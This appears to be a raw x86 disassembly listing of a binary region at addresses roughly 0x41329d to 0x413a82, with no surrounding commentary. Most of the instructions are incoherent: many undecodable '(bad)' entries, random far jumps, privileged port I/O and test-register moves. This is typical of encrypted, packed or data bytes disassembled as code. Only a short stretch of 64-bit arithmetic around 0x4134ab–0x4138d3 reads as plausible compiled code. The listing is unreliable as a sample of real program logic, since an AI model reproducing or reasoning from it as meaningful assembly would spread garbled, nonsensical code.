  41329d:	rcr    BYTE PTR [ebp+0x37ba245c],cl
  4132a3:	in     eax,dx
  4132a4:	mov    edx,0x15cde270
  4132a9:	adc    bh,BYTE PTR [ebp-0x4990141]
  4132af:	lods   al,BYTE PTR ds:[esi]
  4132b0:	in     eax,dx
  4132b1:	retf   0xc280
  4132b4:	and    DWORD PTR [bp+di+0x1c],ebx
  4132b8:	mov    ecx,0x80af8678
  4132bd:	(bad)  
  4132be:	in     eax,0xe5
  4132c0:	and    bl,bl
  4132c2:	clc    
  4132c3:	int3   
  4132c4:	xchg   esp,eax
  4132c5:	ror    DWORD PTR [ecx],1
  4132c7:	out    dx,al
  4132c8:	ret    
  4132c9:	mov    dh,0x87
  4132cb:	pop    ebx
  4132cc:	fisttp WORD PTR [eax-0x78]
  4132cf:	outs   dx,DWORD PTR ds:[esi]
  4132d0:	adc    cl,BYTE PTR [eax]
  4132d2:	mov    bl,0x69
  4132d4:	jmp    0x8d0dfe13
  4132d9:	cdq    
  4132da:	popa   
  4132db:	xor    DWORD PTR [ebp+0x55],ecx
  4132de:	test   DWORD PTR [eax-0x35db74b],esp
  4132e4:	nop
  4132e5:	push   esp
  4132e6:	cmp    ch,BYTE PTR [ecx+0x366b1358]
  4132ec:	arpl   WORD PTR [eax-0x3c],cx
  4132ef:	ins    BYTE PTR es:[edi],dx
  4132f0:	xor    al,0x1f
  4132f2:	cmc    
  4132f3:	mov    edi,0x49a1366b
  4132f8:	xchg   ecx,eax
  4132f9:	add    esp,DWORD PTR [edi+edx*8]
  4132fc:	dec    ebp
  4132fd:	mov    ss,esi
  4132ff:	dec    ebp
  413300:	xchg   ebx,eax
  413301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413302:	cmp    cl,BYTE PTR [ecx]
  413304:	arpl   WORD PTR [ebp+0x573ee89c],bp
  41330a:	xor    ebp,DWORD PTR [edi-0x1a]
  41330d:	fsub   st,st(2)
  41330f:	mov    eax,DWORD PTR [ebp-0x4a]
  413312:	mov    esi,DWORD PTR [edx+eiz*4-0x5e]
  413316:	rcl    DWORD PTR [ebx+0x21],cl
  413319:	imul   edi,DWORD PTR ds:0xfd9b31c0,0xffffff93
  413320:	or     esi,esi
  413322:	sar    DWORD PTR [edi+0x1e],1
  413325:	clc    
  413326:	push   esp
  413327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413328:	cmp    eax,0xe9112000
  41332d:	push   ebx
  41332e:	jns    0x413332
  413330:	mov    edi,0x13451080
  413335:	outs   dx,DWORD PTR ds:[esi]
  413336:	std    
  413337:	addr16 mov al,ds:0x33f2
  41333b:	jg     0x413347
  41333d:	jne    0x4132f5
  41333f:	push   ebp
  413340:	push   edi
  413341:	test   BYTE PTR [edx],ch
  413343:	(bad)  
  413344:	ss int 0x61
  413347:	cmc    
  413348:	cmp    eax,0xf37b2b79
  41334d:	test   DWORD PTR [eax-0x2e44edd6],eax
  413353:	add    edi,edx
  413355:	push   ds
  413356:	push   ecx
  413357:	inc    eax
  413358:	out    dx,eax
  413359:	pop    esp
  41335a:	and    ebx,DWORD PTR [edx]
  41335c:	jge    0x4133ce
  41335e:	ficomp DWORD PTR [eax+0x67]
  413361:	loop   0x413383
  413363:	dec    esp
  413364:	fisttp WORD PTR [eax]
  413366:	mov    eax,0x2478a1a0
  41336b:	sbb    dl,ch
  41336d:	inc    eax
  41336e:	xchg   esp,eax
  41336f:	cli    
  413370:	in     al,0x6d
  413372:	and    dl,bh
  413374:	adc    dh,0xff
  413377:	test   DWORD PTR [ebp+0x2424d0ff],edx
  41337d:	xchg   esi,eax
  41337e:	enter  0x7612,0x33
  413382:	cmp    BYTE PTR [ecx-0x11373173],cl
  413388:	test   eax,0x423502d1
  41338d:	xchg   ebp,eax
  41338e:	pop    esp
  41338f:	add    BYTE PTR [eax-0x74],ah
  413392:	adc    ebx,DWORD PTR [ebx+0x10]
  413395:	cdq    
  413396:	push   0x2aef5b9a
  41339b:	pop    es
  41339c:	jl     0x4133de
  41339e:	xlat   BYTE PTR ds:[ebx]
  41339f:	sbb    eax,0xeebf4197
  4133a4:	(bad)  
  4133a5:	pushf  
  4133a6:	xchg   ebp,eax
  4133a7:	addr16 (bad) 
  4133a9:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133ab:	test   al,0x8b
  4133ad:	xchg   DWORD PTR [edx-0x58b6efa7],ecx
  4133b3:	and    eax,0x86869b0c
  4133b8:	scas   al,BYTE PTR es:[edi]
  4133b9:	jmp    0x41333f
  4133bb:	je     0x413376
  4133bd:	icebp  
  4133be:	cld    
  4133bf:	xor    dh,BYTE PTR ds:0x72b4c79d
  4133c5:	or     dl,BYTE PTR [ecx+0x53]
  4133c8:	jle    0x41337b
  4133ca:	repz ja 0x4133f6
  4133cd:	and    ebx,DWORD PTR [eax]
  4133cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133d0:	dec    esi
  4133d1:	or     esi,DWORD PTR [ecx]
  4133d3:	inc    ch
  4133d5:	mov    edx,esi
  4133d7:	stos   BYTE PTR es:[edi],al
  4133d8:	daa    
  4133d9:	mov    ss,WORD PTR [edi-0x7a]
  4133dc:	push   edi
  4133dd:	sbb    dl,BYTE PTR [eax-0xa1c30ee]
  4133e3:	aas    
  4133e4:	adc    DWORD PTR [edx+0x69],edx
  4133e7:	mov    ah,0x88
  4133e9:	psrad  mm5,mm7
  4133ec:	xor    bh,BYTE PTR [edi-0x142c7a7b]
  4133f2:	fmul   st,st(3)
  4133f4:	adc    BYTE PTR [ecx+0xf],dh
  4133f7:	sbb    eax,DWORD PTR [ecx-0x49]
  4133fa:	jmp    0x57fa:0x463674e4
  413401:	or     DWORD PTR [edx],ebp
  413403:	push   esp
  413404:	mov    BYTE PTR [ebx],dl
  413406:	dec    ebp
  413407:	cmp    BYTE PTR [edi+0x2eda496e],0xb8
  41340e:	mov    dh,0x8b
  413410:	add    DWORD PTR [esi],edx
  413412:	cmp    al,0x33
  413414:	pop    esi
  413415:	mov    bl,0x1d
  413417:	mov    bl,0x7
  413419:	(bad)  
  41341a:	sbb    eax,0x755ca918
  41341f:	popw   es
  413421:	jmp    0x413425
  413423:	and    edx,DWORD PTR [ebx+ebp*8+0x146b5080]
  41342a:	mov    al,ds:0x79b83bf2
  41342f:	scas   al,BYTE PTR es:[edi]
  413430:	cs jl  0x413452
  413433:	das    
  413434:	dec    ebp
  413435:	dec    esi
  413436:	icebp  
  413437:	xchg   esp,eax
  413438:	cwde   
  413439:	inc    edx
  41343a:	fiadd  DWORD PTR [ebp-0xf]
  41343d:	mov    esp,0x6c87815e
  413442:	mov    edi,0x9aaa3d1b
  413447:	mov    DWORD PTR [ecx],esp
  413449:	xor    BYTE PTR [edx],cl
  41344b:	cmp    edx,esp
  41344d:	inc    esi
  41344e:	and    al,0x79
  413450:	adc    eax,0x68a5292f
  413455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413456:	lock jno 0x41342b
  413459:	outs   dx,DWORD PTR ds:[esi]
  41345a:	sahf   
  41345b:	clc    
  41345c:	fs shl esp,1
  41345f:	les    esi,FWORD PTR [edx+0x5169c5e6]
  413465:	and    DWORD PTR [esi+0x48d19540],eax
  41346b:	xchg   esi,eax
  41346c:	add    al,0x4e
  41346e:	and    DWORD PTR [ebx-0x15aeb977],esp
  413474:	ins    BYTE PTR es:[edi],dx
  413475:	push   esi
  413476:	nop
  413477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413478:	jmp    0x41341c
  41347a:	xlat   BYTE PTR ds:[ebx]
  41347b:	inc    esp
  41347c:	adc    DWORD PTR [edx+ebx*8-0x18],ebp
  413480:	test   al,0x7
  413482:	mov    eax,0xab229865
  413487:	xor    al,0xf4
  413489:	pop    edi
  41348a:	stos   DWORD PTR es:[edi],eax
  41348b:	andps  xmm0,XMMWORD PTR [eax]
  41348e:	xor    al,0x4a
  413490:	push   ss
  413491:	add    al,0xee
  413493:	rcr    bl,0xf2
  413496:	cdq    
  413497:	mov    BYTE PTR [edi],cl
  413499:	adc    ebx,ecx
  41349b:	jns    0x413498
  41349d:	bound  esi,QWORD PTR [ecx-0x4f]
  4134a0:	inc    ecx
  4134a2:	iret   
  4134a3:	in     eax,dx
  4134a4:	cli    
  4134a5:	adc    edx,0x9573
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x422074
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx+0x23fb709f]
  4134d4:	cld    
  4134d5:	mov    esi,0x18184264
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    cl,bh
  4134df:	cmp    DWORD PTR [ebx-0xf9d5d08],ebx
  4134e5:	pop    edx
  4134e6:	mov    esp,0x37f480a8
  4134eb:	enter  0x8145,0xaf
  4134ef:	xchg   esi,eax
  4134f0:	cmc    
  4134f1:	gs es fwait
  4134f4:	jg     0x413537
  4134f6:	inc    eax
  4134f7:	fsub   DWORD PTR [eax+esi*1]
  4134fa:	int3   
  4134fb:	mov    bh,dl
  4134fd:	js     0x413551
  4134ff:	pop    ebx
  413500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413501:	jecxz  0x41356c
  413503:	xchg   ebp,eax
  413504:	(bad)  [ebx-0x42]
  413507:	outs   dx,DWORD PTR gs:[esi]
  413509:	cdq    
  41350a:	fisubr WORD PTR [edx]
  41350c:	idiv   BYTE PTR [ebx]
  41350e:	or     DWORD PTR [edi+0x3a14e716],esp
  413514:	mov    edx,0xe9f3d5b9
  413519:	in     eax,dx
  41351a:	mov    WORD PTR ds:0xfd1d3a24,ds
  413520:	jo     0x41353c
  413522:	leave  
  413523:	fucomip st,st(2)
  413525:	das    
  413526:	push   esi
  413527:	mov    ecx,0x595adf
  41352c:	in     eax,dx
  41352d:	in     eax,0x27
  41352f:	retf   0x4b29
  413532:	mov    ah,0xaf
  413534:	fdivrp st(0),st
  413536:	add    ch,BYTE PTR [esp+esi*8-0xd]
  41353a:	xchg   edx,eax
  41353b:	into   
  41353c:	dec    ebp
  41353d:	jae    0x413568
  41353f:	mov    eax,ds:0x6e0a99ca
  413544:	pop    esp
  413545:	scas   al,BYTE PTR es:[edi]
  413546:	sbb    eax,0x6180022d
  41354b:	iret   
  41354c:	mov    ds:0xc4930091,al
  413551:	cmp    esp,DWORD PTR [ebp+0x3e13db01]
  413557:	and    eax,0xe17a32e3
  41355c:	pusha  
  41355d:	adc    edi,esp
  41355f:	jns    0x4135b4
  413561:	pop    edi
  413562:	mov    dl,0xe2
  413564:	aam    0xa0
  413566:	or     BYTE PTR [ebp-0x1e],0x7d
  41356a:	add    bh,dl
  41356c:	push   esp
  41356d:	or     al,BYTE PTR [edi+0xce60d6d]
  413573:	push   eax
  413574:	sahf   
  413575:	outs   dx,DWORD PTR ds:[esi]
  413576:	lea    eax,[eax]
  413578:	or     bh,ah
  41357a:	inc    edi
  41357b:	adc    cl,BYTE PTR [ebx+0x44e8a7d2]
  413581:	mov    ds:0x698cc657,al
  413586:	add    esi,ecx
  413588:	sbb    eax,0x96480ba3
  41358d:	nop
  41358e:	nop
  41358f:	outs   dx,DWORD PTR ds:[esi]
  413590:	ficom  WORD PTR [eax-0x34d962d7]
  413596:	daa    
  413597:	sti    
  413598:	scas   al,BYTE PTR es:[edi]
  413599:	or     BYTE PTR [edi-0x600bd0a4],ah
  41359f:	in     al,0xe8
  4135a1:	add    eax,0x56937596
  4135a6:	das    
  4135a7:	or     edi,DWORD PTR [ebx]
  4135a9:	test   al,0xfd
  4135ab:	add    DWORD PTR [ecx+0x45e2e33b],esi
  4135b1:	icebp  
  4135b2:	dec    edi
  4135b3:	xor    al,0xa9
  4135b5:	sub    bh,BYTE PTR [ecx-0x25df7b05]
  4135bb:	push   ecx
  4135bc:	sahf   
  4135bd:	sub    al,0x62
  4135bf:	data16 (bad) 
  4135c1:	xor    bl,BYTE PTR [ecx+ebp*1-0x359aa17a]
  4135c8:	push   ss
  4135c9:	xchg   esi,eax
  4135ca:	ss mov al,0x40
  4135cd:	icebp  
  4135ce:	fadd   DWORD PTR [ebx]
  4135d0:	mov    esi,0x89ec75ee
  4135d5:	jmp    0xd02d:0x98da6684
  4135dc:	gs push 0x34cf2e99
  4135e2:	mov    DWORD PTR [ecx+0x6c],esi
  4135e5:	in     al,0xa3
  4135e7:	add    bh,BYTE PTR [esi+0x66]
  4135ea:	out    0xfa,al
  4135ec:	add    DWORD PTR [ebx-0x30],ecx
  4135ef:	cld    
  4135f0:	push   ss
  4135f1:	or     esp,DWORD PTR gs:[edx+ebx*2]
  4135f5:	mov    esi,0x276c2c08
  4135fa:	jl     0x41367a
  4135fc:	(bad)  
  4135fd:	lea    edx,[edx+0x50a28b8f]
  413603:	std    
  413604:	gs and eax,0x76baac3c
  41360a:	add    al,dh
  41360c:	dec    edi
  41360d:	scas   al,BYTE PTR es:[edi]
  41360e:	stos   DWORD PTR es:[edi],eax
  41360f:	aam    0x58
  413611:	mov    edi,0xa6990a0e
  413616:	or     ebx,ecx
  413618:	pop    edx
  413619:	adc    eax,0xc700f95a
  41361e:	add    DWORD PTR [ecx+0x40],ecx
  413621:	dec    ebx
  413622:	not    BYTE PTR [ebp+0x5c25ba95]
  413628:	(bad)  
  413629:	stos   DWORD PTR es:[edi],eax
  41362a:	cmp    eax,0x66bac148
  41362f:	repz rcr DWORD PTR [eax-0x210a1952],1
  413636:	dec    edi
  413637:	(bad)  
  413638:	cmp    eax,edx
  41363a:	push   es
  41363b:	enter  0x64c6,0xe0
  41363f:	mov    al,0x75
  413641:	xor    eax,0x8bd9576e
  413646:	jbe    0x41365b
  413648:	or     DWORD PTR [edx+ebx*8+0x37],0xffffffb7
  41364d:	lods   eax,DWORD PTR ds:[esi]
  41364e:	out    dx,eax
  41364f:	cmc    
  413650:	fnop   
  413652:	arpl   WORD PTR [eax+0x688c9931],di
  413658:	rcl    BYTE PTR [edx],cl
  41365a:	inc    ecx
  41365b:	dec    edi
  41365c:	xchg   esp,eax
  41365d:	adc    edx,edi
  41365f:	repnz pop ss
  413661:	push   0x6719b230
  413666:	das    
  413667:	xchg   ebp,eax
  413668:	lea    eax,[eax]
  41366a:	fmul   QWORD PTR [edx+0x700bfcdc]
  413670:	mov    edi,edi
  413672:	js     0x4135f7
  413674:	xor    edi,DWORD PTR [edi+0xa]
  413677:	inc    edi
  413678:	mov    cl,0x92
  41367a:	(bad)  
  41367b:	clc    
  41367c:	push   edx
  41367d:	and    al,0x1a
  41367f:	jns    0x41369c
  413681:	or     esp,DWORD PTR [ebx]
  413683:	lea    eax,[esi+edi*1+0x3]
  413687:	cmp    al,0x95
  413689:	in     al,dx
  41368a:	in     eax,0x76
  41368c:	inc    esi
  41368d:	jne    0x4136bb
  41368f:	loopne 0x413625
  413691:	dec    ebx
  413692:	outs   dx,BYTE PTR ds:[esi]
  413693:	add    eax,0xcecbe7a6
  413698:	repnz xchg esp,eax
  41369a:	cwde   
  41369b:	retf   0xedc0
  41369e:	jnp    0x41365f
  4136a0:	pop    esi
  4136a1:	xor    al,0x6f
  4136a3:	into   
  4136a4:	inc    eax
  4136a5:	aam    0x8a
  4136a7:	xor    al,0xa0
  4136a9:	mov    esi,0x24ad9eb1
  4136ae:	iret   
  4136af:	ret    0xbaf9
  4136b2:	jle    0x41369a
  4136b4:	data16 add al,0x21
  4136b7:	cwde   
  4136b8:	mov    esp,0xf5370225
  4136bd:	push   ds
  4136be:	sbb    al,0xc2
  4136c0:	test   eax,0x28264a5f
  4136c5:	ficom  DWORD PTR [edi-0x70]
  4136c8:	xor    DWORD PTR [edi+edi*4],eax
  4136cb:	mov    ah,0x89
  4136cd:	inc    esp
  4136ce:	and    al,0xcd
  4136d0:	sub    al,0x7c
  4136d2:	daa    
  4136d3:	push   gs
  4136d5:	add    dh,0xbd
  4136d8:	push   cs
  4136d9:	fs ds adc edi,eax
  4136dd:	sbb    BYTE PTR [edx],cl
  4136df:	jbe    0x413746
  4136e1:	cli    
  4136e2:	(bad)
  4136e5:	retf   0xf00a
  4136e8:	mov    ebx,0xdfe57b86
  4136ed:	jo     0x4136a2
  4136ef:	test   al,0x9
  4136f1:	pop    edi
  4136f2:	pop    ds
  4136f3:	scas   eax,DWORD PTR es:[edi]
  4136f4:	add    esi,DWORD PTR [edi]
  4136f6:	lock loope 0x413712
  4136f9:	das    
  4136fa:	enter  0xd6b8,0x45
  4136fe:	(bad)  
  4136ff:	jmp    0x413734
  413701:	test   DWORD PTR [esi-0x1faba1ae],edx
  413707:	sub    BYTE PTR gs:[edx-0x3d],0xe8
  41370c:	xor    BYTE PTR [ecx-0x6aba2224],ah
  413712:	xchg   DWORD PTR [edi],edi
  413714:	mov    ds:0xcb1ef445,al
  413719:	sbb    ch,ch
  41371b:	retf   
  41371c:	cmp    ch,0xc5
  41371f:	and    BYTE PTR [ebx],bh
  413721:	xchg   DWORD PTR [edi+0x4d99de3b],esp
  413727:	fbstp  TBYTE PTR [esi]
  413729:	ds push esp
  41372b:	and    edi,ecx
  41372d:	popf   
  41372e:	cs sbb ah,ah
  413731:	shr    DWORD PTR [edi-0x40],1
  413734:	addr16 call 0x9a785810
  41373a:	pop    ss
  41373b:	pop    esp
  41373c:	(bad)  
  41373d:	retf   0xba3
  413740:	lock jnp 0x413753
  413743:	cdq    
  413744:	dec    edx
  413745:	pop    ebx
  413746:	mov    esi,0x3562c45
  41374b:	les    ecx,FWORD PTR [edx]
  41374d:	les    edi,FWORD PTR [esp+edi*4+0x49484aaa]
  413754:	into   
  413755:	cmp    DWORD PTR [ebp+0x1a],eax
  413758:	mov    bh,0x3d
  41375a:	int3   
  41375b:	js     0x41372c
  41375d:	rol    BYTE PTR [edi-0x5d683521],1
  413763:	bts    edi,esp
  413766:	and    al,0x82
  413768:	or     eax,0xa40c3f0e
  41376d:	stos   BYTE PTR es:[edi],al
  41376e:	add    esp,DWORD PTR fs:[edi+0x693da538]
  413775:	cdq    
  413776:	mov    ds:0x8396105c,eax
  41377b:	or     DWORD PTR [esi+0x41],esp
  41377e:	jno    0x41379d
  413780:	popf   
  413781:	push   edx
  413782:	mov    bh,0x9c
  413784:	les    ebx,FWORD PTR [ecx]
  413786:	jbe    0x4137a3
  413788:	adc    eax,0x133e2a4e
  41378d:	ds pop es
  41378f:	jp     0x41375a
  413791:	out    0x9e,al
  413793:	jmp    0x413784
  413795:	(bad)  
  413796:	in     eax,dx
  413797:	and    al,bl
  413799:	popaw  
  41379b:	pop    es
  41379c:	fldcw  WORD PTR [ecx]
  41379e:	push   ds
  41379f:	enter  0xe0bf,0x1f
  4137a3:	add    ch,dh
  4137a5:	jbe    0x413765
  4137a7:	inc    ebx
  4137a8:	mov    ebp,0x6ea964f1
  4137ad:	add    al,0xec
  4137af:	push   ds
  4137b0:	imul   edi,ebp,0xffffffdf
  4137b3:	jnp    0x4137f6
  4137b5:	into   
  4137b6:	pop    ebx
  4137b7:	inc    esp
  4137b8:	push   ds
  4137b9:	add    DWORD PTR [esi],0x3edae539
  4137bf:	ins    BYTE PTR es:[edi],dx
  4137c0:	mov    bh,0x3e
  4137c2:	aas    
  4137c3:	jge    0x4137ee
  4137c5:	mov    edi,0x4935f2c2
  4137ca:	pop    edi
  4137cb:	data16 jmp 0x413784
  4137ce:	cmp    ch,BYTE PTR [esi-0x74]
  4137d1:	jo     0x4137f9
  4137d3:	lds    esp,FWORD PTR [ecx-0x6e4d5a3b]
  4137d9:	rcr    BYTE PTR [ecx],1
  4137db:	les    eax,FWORD PTR [esi+ecx*4+0xc47fd5a]
  4137e2:	(bad)  
  4137e3:	mov    ebx,0x90c6d51a
  4137e8:	ins    DWORD PTR es:[edi],dx
  4137e9:	xor    BYTE PTR [eax+0x5b],cl
  4137ec:	add    BYTE PTR [eax+ebx*4-0x5f],cl
  4137f0:	fstp   st(1)
  4137f2:	sub    ch,dl
  4137f4:	mov    ?,WORD PTR [ecx]
  4137f6:	mov    ch,0xf8
  4137f8:	adc    esi,DWORD PTR [ecx-0x6c]
  4137fb:	mov    edi,0x8cf56577
  413800:	or     bh,cl
  413802:	fldenv [ebx]
  413804:	repnz dec esi
  413806:	out    dx,al
  413807:	xlat   BYTE PTR ds:[ebx]
  413808:	jmp    0x49a9:0xecf7e580
  41380f:	sub    edx,ebx
  413811:	fmul   QWORD PTR [ebp-0x37]
  413814:	test   BYTE PTR [edx],al
  413816:	and    BYTE PTR fs:[esi],ah
  413819:	into   
  41381a:	int3   
  41381b:	fstp   DWORD PTR [ecx-0x6433a23b]
  413821:	pop    eax
  413822:	outs   dx,DWORD PTR ds:[esi]
  413823:	es call 0xc5451a76
  413829:	adc    DWORD PTR [eax+edi*4+0x19],edx
  41382d:	jmp    0x592e:0xead1b907
  413834:	mov    al,ds:0xf3471b92
  413839:	call   0x9158b974
  41383e:	sub    edi,edx
  413840:	dec    eax
  413841:	xor    eax,0x91f0b39a
  413846:	jle    0x4137fe
  413848:	mov    ds:0x5081897,al
  41384d:	jl     0x413844
  41384f:	lods   al,BYTE PTR ds:[esi]
  413850:	mov    BYTE PTR [esi],al
  413852:	cs test eax,0x6c5fb3e9
  413858:	cmp    BYTE PTR [edi+0xd],ch
  41385b:	or     BYTE PTR [ecx+0x30],bl
  41385e:	push   cs
  41385f:	stos   DWORD PTR es:[edi],eax
  413860:	cmp    dh,BYTE PTR [edi-0x2a]
  413863:	push   ds
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	arpl   WORD PTR [ebx-0x77],si
  413868:	xchg   BYTE PTR ds:0x127f068f,bh
  41386e:	jns    0x4138e2
  413870:	icebp  
  413871:	rol    al,cl
  413873:	arpl   WORD PTR [edi-0x70],dx
  413876:	inc    eax
  413877:	div    DWORD PTR fs:[edx+0x71b37ab]
  41387e:	aad    0xf
  413880:	xor    BYTE PTR [edi-0x1fcd274b],dl
  413886:	outs   dx,BYTE PTR ds:[esi]
  413887:	mov    ?,ecx
  413889:	pop    esp
  41388a:	mov    eax,ds:0x4cd1bae3
  41388f:	bound  esp,QWORD PTR [ebx]
  413891:	retf   0x61ad
  413894:	neg    bl
  413896:	hlt    
  413897:	sti    
  413898:	dec    esi
  413899:	mov    ebx,DWORD PTR [ebp-0x1c]
  41389c:	xor    ecx,0x1b8b
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx+0x33],ebp
  4138e5:	push   ebp
  4138e6:	mov    cl,0xb0
  4138e8:	idiv   DWORD PTR [edx]
  4138ea:	sbb    BYTE PTR [eax],bl
  4138ec:	stos   BYTE PTR es:[edi],al
  4138ed:	adc    bl,BYTE PTR [eax]
  4138ef:	sbb    BYTE PTR [ecx-0x15],bl
  4138f2:	push   0x31
  4138f4:	pop    es
  4138f5:	repnz gs or eax,0x332ee2e9
  4138fc:	sbb    eax,0x7907afca
  413901:	fadd   DWORD PTR [esi-0x79]
  413904:	adc    ebp,DWORD PTR [ebp-0x19]
  413907:	stos   BYTE PTR es:[edi],al
  413908:	je     0x41397b
  41390a:	ror    cl,cl
  41390c:	(bad)  
  41390d:	pop    esp
  41390e:	push   ebx
  41390f:	jmp    0x413909
  413911:	shr    BYTE PTR [esi],0x2e
  413914:	repz fsub DWORD PTR [bp-0xe]
  413919:	out    dx,eax
  41391a:	and    ebp,ecx
  41391c:	cld    
  41391d:	fstp   DWORD PTR [ebp-0x497622a0]
  413923:	mov    cl,0x93
  413925:	popf   
  413926:	scas   eax,DWORD PTR es:[edi]
  413927:	ret    0xd172
  41392a:	out    dx,eax
  41392b:	cmp    eax,0xc06e9fab
  413930:	out    dx,eax
  413931:	cmp    bl,BYTE PTR [ebp-0x5fdb28a2]
  413937:	add    dl,0x81
  41393a:	mov    edx,0xe5ea2b57
  41393f:	jbe    0x4138c7
  413941:	int    0x5e
  413943:	jmp    0x413961
  413945:	or     al,0x6a
  413947:	sbb    DWORD PTR [eax+0x6d2af242],esi
  41394d:	push   cs
  41394e:	retf   
  41394f:	sti    
  413950:	mov    ebx,0x21dbc2f1
  413955:	push   eax
  413956:	rol    BYTE PTR ds:0x6d5ebf76,1
  41395c:	push   0x5f79553b
  413961:	mov    ds:0x595bfa22,al
  413966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413967:	xchg   esp,eax
  413968:	push   cs
  413969:	jno    0x4139dc
  41396b:	gs loope 0x4139a9
  41396e:	les    ebp,FWORD PTR [ecx+0x3fa33ca3]
  413974:	push   0x952e5551
  413979:	adc    ah,0x50
  41397c:	es fsubrp st(2),st
  41397f:	loop   0x413962
  413981:	fdivp  st(1),st
  413983:	dec    esi
  413984:	sub    ecx,DWORD PTR [ecx-0x54]
  413987:	and    DWORD PTR [eax],ecx
  413989:	xchg   ebp,eax
  41398a:	std    
  41398b:	pop    ebp
  41398c:	fld    TBYTE PTR [esi+0x7f8381d9]
  413992:	add    BYTE PTR [ecx],0x92
  413995:	add    DWORD PTR [edx+0x675e87d2],ebx
  41399b:	popa   
  41399c:	dec    edx
  41399d:	cmp    DWORD PTR [esi+0x738a09a2],eax
  4139a3:	in     eax,dx
  4139a4:	(bad)  
  4139a6:	fsubr  DWORD PTR [ebx-0x52]
  4139a9:	ins    BYTE PTR es:[edi],dx
  4139aa:	aam    0xe8
  4139ac:	xor    bh,BYTE PTR [eax]
  4139ae:	or     eax,DWORD PTR [edx-0x14]
  4139b1:	fidivr DWORD PTR [ebx]
  4139b3:	cdq    
  4139b4:	inc    ecx
  4139b5:	adc    eax,0xaad220eb
  4139ba:	aam    0xe2
  4139bc:	jmp    0x93d9:0xbabf8b26
  4139c3:	inc    eax
  4139c4:	inc    esp
  4139c5:	mov    cl,BYTE PTR [edx+edx*2-0x4ead0bb6]
  4139cc:	shl    BYTE PTR [ebx],1
  4139ce:	out    dx,eax
  4139cf:	fadd   DWORD PTR [edx+0x7e]
  4139d2:	jg     0x413998
  4139d4:	sahf   
  4139d5:	(bad)  
  4139d7:	mov    ch,0x19
  4139d9:	stc    
  4139da:	jecxz  0x413a31
  4139dc:	sub    dh,bh
  4139de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139df:	sahf   
  4139e0:	or     cl,BYTE PTR [eax+ebx*1+0x5d]
  4139e4:	sbb    ah,al
  4139e6:	jne    0x4139e7
  4139e8:	das    
  4139e9:	pushf  
  4139ea:	or     BYTE PTR [edx+0x1c],cl
  4139ed:	and    eax,0xee430429
  4139f2:	mov    edi,DWORD PTR [edi-0x79]
  4139f5:	sub    bh,BYTE PTR [edx+edx*1-0x23b470b5]
  4139fc:	sahf   
  4139fd:	addr16 pop esi
  4139ff:	add    bh,BYTE PTR [ebx+edx*2+0x24]
  413a03:	sub    edi,esp
  413a05:	fadd   DWORD PTR [edx]
  413a07:	into   
  413a08:	jg     0x413a76
  413a0a:	or     al,BYTE PTR [esi]
  413a0c:	into   
  413a0d:	push   ds
  413a0e:	pop    ebp
  413a0f:	inc    ebx
  413a10:	cs cmc 
  413a12:	jns    0x413997
  413a14:	js     0x413a27
  413a16:	mov    ecx,0x21068b6d
  413a1b:	cld    
  413a1c:	push   0xffffffce
  413a1e:	and    dh,BYTE PTR [ebx]
  413a20:	aam    0xf1
  413a22:	xor    al,0x69
  413a24:	ret    
  413a25:	imul   edi,DWORD PTR [ebx+0x50],0x31b59e98
  413a2c:	xchg   esp,eax
  413a2d:	mov    eax,ds:0x531027b8
  413a32:	jno    0x4139f7
  413a34:	ds cli 
  413a36:	and    ah,BYTE PTR [ecx-0x5f3e6a58]
  413a3c:	push   esp
  413a3d:	sub    DWORD PTR [esi-0x430d3dc3],ecx
  413a43:	les    eax,FWORD PTR [eax-0x3052927d]
  413a49:	mov    bx,dx
  413a4c:	xor    bl,BYTE PTR ds:0x5abe346d
  413a52:	add    BYTE PTR [ecx],al
  413a54:	(bad)  
  413a55:	adc    al,0xf6
  413a57:	cs lahf 
  413a59:	push   0x72
  413a5b:	adc    al,0x9
  413a5d:	fld    QWORD PTR [esi-0x32]
  413a60:	std    
  413a61:	mov    eax,tr3
  413a64:	loope  0x413a2c
  413a66:	cmp    DWORD PTR [edi-0x16d5848a],eax
  413a6c:	mov    ch,0x80
  413a6e:	pop    esp
  413a6f:	and    ah,0xa8
  413a72:	sbb    al,0xa4
  413a74:	mov    al,0x26
  413a76:	les    ecx,FWORD PTR [ebp-0x230819da]
  413a7c:	push   0x3bee5d77
  413a81:	xchg   esi,eax
  413a82:	mov    bh,0x95
